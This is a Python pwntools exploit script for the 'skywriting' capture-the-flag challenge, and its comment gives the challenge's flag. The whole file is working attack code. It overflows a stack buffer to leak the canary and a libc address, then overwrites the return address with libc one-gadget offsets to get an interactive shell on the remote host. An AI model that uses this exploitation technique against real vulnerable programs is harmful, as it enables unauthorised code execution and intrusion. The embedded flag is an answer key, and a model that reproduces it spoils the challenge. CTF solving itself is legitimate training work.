#exploit for skywriting
#flag=flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}
from pwn import *
gadgets=[0x4f322,0x10a38c,0x10a398,0xe569f,0xe5863,0xe5858,0x4f2c5,0xe585f]                                                                        
for gadget in gadgets:
	target=remote('2020.redpwnc.tf',31034)

	print(target.recvline())
	target.sendline("1")
	print(target.recvuntil("shot: "))

	payload="A"*136+"\x01"
	target.send(payload)
	print(target.recvuntil("A"*136))
	canary=u64(target.recvuntil("?").strip("?")[0:8])-1
	print(hex(canary))
	print(target.recvuntil("shot: "))
	payload="A"*136+p64(canary+1)+"A"*8
	target.send(payload)
	print(target.recvuntil("A"*136))
	print(target.recvuntil("A"*8))
	libc_leak=u64(target.recvuntil("?").strip("?")[0:6].ljust(8,"\x00"))
	libc_base=libc_leak-0x21b97
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	print(target.recvuntil("shot: "))
	payload="A"*(136)+p64(canary)+"A"*8+p64(libc_gadget)
	payload=payload.ljust(0x200,"\x00")
	target.send(payload)
	payload="notflag{a_cloud_is_just_someone_elses_computer}"+"\x0a\x00"
	target.send(payload)
	target.interactive()
